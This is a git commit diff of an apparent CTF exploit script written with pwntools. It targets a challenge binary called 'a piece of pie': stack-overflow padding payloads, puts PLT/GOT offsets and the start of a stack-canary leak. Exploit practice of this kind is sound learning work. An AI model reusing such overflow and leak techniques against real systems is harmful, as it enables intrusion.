cf8845d8f4a76b22fd05a302ed8d39539526254e
Brian <hibrian827@gmail.com>
2024-04-04 17:00:39 +0900

    started process method

--- WHS/main.py
+++ WHS/main.py
@@ -1,7 +1,10 @@
 from pwn import *
 
-port =  20465
-rem = remote("srv1.kitriwhs.kr", port)
+# port =  23371
+# rem = remote("srv1.kitriwhs.kr", port)
+
+
+rem = proc("./a piece of pie")
 
 puts_offset = 0x80e50
 puts_plt = 0x10b0
@@ -13,12 +16,12 @@ puts_got = 0x3fa0
 # libc = ELF('./WHS/a piece of pie/problem/libc.so.6')
 
 payload = b"A" * 0x1
-rem.sendlineafter(b"name: ", payload)
+rem.sendafter(b"name: ", payload)
 print(rem.recvline())
 
 
-payload = b"A" * 0xa7
-rem.sendlineafter(b"1: ", payload)
+payload = b"A" * 0xa9
+rem.sendafter(b"1: ", payload)
 print(rem.recvline())
 
 canary = b""
